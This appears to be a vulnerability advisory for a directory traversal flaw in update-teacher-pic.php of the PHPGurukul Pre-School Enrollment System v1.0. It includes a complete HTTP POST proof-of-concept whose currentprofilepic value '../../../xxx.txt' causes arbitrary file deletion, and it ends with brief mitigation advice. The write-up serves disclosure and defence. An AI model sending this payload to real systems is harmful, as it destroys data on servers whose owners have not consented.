# PHPGurukul Pre-School Enrollment System Project directory traversal vulnerability-4(update-teacher-pic.php)

**PHPGurukul  Pre-School Enrollment System Project introduce**
   
   PHPGurukul Pre-School Enrollment System Project is a web-based pre-school enrollment system by PHPGurukul.   

**Vulnerability description**

   There is a security vulnerability in PHPGurukul Pre-School Enrollment System Project v1.0. The vulnerability is caused by  directory traversal vulnerability, which allows remote attackers to traverse directories and delete traversed files.

 PHPGurukul Project address

   
   https://phpgurukul.com/pre-school-enrollment-system-using-php-and-mysql/

   During the code audit, it was found that there was a problem with currentprofilepic in the update-teacher-pic.php file 
   Lines 15 and 16 get the currentprofilepic parameter and assign it to oldprofilepic. No verification is performed on currentprofilepic.
   ![1](https://github.com/baixiaobi/Pre-School-/blob/main/screenshot3/8.png)   
   Line 40 unlink oldprofilepic, which leads to this directory traversal vulnerability
   ![9](https://github.com/baixiaobi/Pre-School-/blob/main/screenshot3/9.png) 
   After analyzing the code, we tried to exploit the vulnerability
   
   **Loophole principle**
   
   Log in to the system backend management system
     
   ![2](https://github.com/baixiaobi/Pre-School-/blob/main/screenshot/2.png)
      
   Find the vulnerable functionality in the update-teacher-pic.php page,   Teachers-Manage-Add Teacher-Update Profile Pic-Update Teacher Profile Pic
  
   ![3](https://github.com/baixiaobi/Pre-School-/blob/main/screenshot3/2.png)
   ![4](https://github.com/baixiaobi/Pre-School-/blob/main/screenshot3/3.png)
   ![5](https://github.com/baixiaobi/Pre-School-/blob/main/screenshot3/7.png)
  
   Intercept the data packet and find the problematic parameter currentprofilepic
   
   ![6](https://github.com/baixiaobi/Pre-School-/blob/main/screenshot3/4.png)

   Transformed into attack payload    


    POST /Pre-School-Enrollment-System-PHP/preschool/admin/update-teacher-pic.php?tid=1 HTTP/1.1
    Host: localhost
    sec-ch-ua-platform: "Windows"
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCOslMZHmxE3UWS8E
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
    Sec-Fetch-Site: same-origin
    Referer: http://localhost/Pre-School-Enrollment-System-PHP/preschool/admin/update-teacher-pic.php?tid=1
    Accept-Language: zh-CN,zh;q=0.9
    Accept-Encoding: gzip, deflate, br, zstd
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Cookie: PHPSESSID=qqnj1t0sdqqbv8qh5jrevaaln8
    Upgrade-Insecure-Requests: 1
    sec-ch-ua-mobile: ?0
    Sec-Fetch-Mode: navigate
    sec-ch-ua: "Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"
    Origin: http://localhost
    Sec-Fetch-Dest: document
    Cache-Control: max-age=0
    Sec-Fetch-User: ?1
    Content-Length: 5637583

    ------WebKitFormBoundaryCOslMZHmxE3UWS8E
    Content-Disposition: form-data; name="currentprofilepic"

    ../../../xxx.txt
    ------WebKitFormBoundaryCOslMZHmxE3UWS8E
    Content-Disposition: form-data; name="profilepic"; filename="804a28a9c5be300aafa9f83527956d13.jpeg"
    Content-Type: image/jpeg


    ------WebKitFormBoundaryCOslMZHmxE3UWS8E
    Content-Disposition: form-data; name="submit"


    ------WebKitFormBoundaryCOslMZHmxE3UWS8E--


   Create xxx.txt test file in  D:\phpstudy_pro\WWW\Pre-School-Enrollment-System-PHP
      ![7](https://github.com/baixiaobi/Pre-School-/blob/main/screenshot3/5.png)

   Send payload, xxx.txt file has been deleted   
   ![8](https://github.com/baixiaobi/Pre-School-/blob/main/screenshot3/6.png)   
   This directory traversal vulnerability can cause the traversed files to be deleted.

 **The affected version**   
 PHPGurukul Pre-School Enrollment System Project v1.0    
 Strictly validate and filter all paths entered by users to ensure that only specified files or directories are allowed to be accessed. Regular expressions can be used to restrict the path format.
 
   
